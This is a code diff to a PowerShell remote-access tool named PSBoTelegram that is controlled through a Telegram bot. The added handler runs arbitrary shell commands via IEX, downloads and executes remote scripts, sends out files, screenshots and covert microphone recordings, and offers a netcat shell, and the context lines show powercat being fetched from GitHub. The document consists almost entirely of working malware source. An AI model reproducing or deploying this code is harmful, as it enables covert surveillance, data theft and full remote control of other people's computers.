@@ -98,7 +98,7 @@ $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master
 
 function screen-shot {param ($botkey,$chat)
 
-$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1\" + "screenshot.png"
 
 Add-Type -AssemblyName System.Windows.Forms
 $resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
@@ -135,5 +135,24 @@ $audio = $ruta + "\" + "audio.wav"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
 Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
 bot-send -file $audio -botkey $botkey -chat_id $chat_id
+
+}
+
+
+test-command {param ($comando,$texto,$help,$botkey,$chat_id)
+ $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio"
+ if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
+ if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
+ if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
+ if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
+ if ($comando -like "/Audio*") {$comando = $comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
+
 
 }
